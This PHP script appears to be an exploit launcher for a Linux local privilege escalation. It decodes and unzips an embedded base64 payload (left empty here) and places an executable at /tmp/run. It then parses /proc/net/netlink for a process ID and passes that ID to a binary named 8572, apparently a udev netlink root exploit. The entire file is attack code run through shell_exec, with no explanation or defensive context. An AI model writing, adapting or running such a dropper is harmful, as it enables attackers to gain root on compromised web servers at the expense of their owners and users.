<?php
	$payload = "";
	shell_exec("echo ".$payload." | base64 -d > payload");
	shell_exec("unzip payload");
	shell_exec("mv ./run /tmp/run");

	$procs = explode("\n", shell_exec("cat /proc/net/netlink"));
    for($i = 0; $i < sizeof($procs); $i++){
        $proc = explode(" ", $procs[$i]);
        if($proc[3] != 0){
            shell_exec("./8572 ".$proc[3]);
            break;
        }
    }
?>
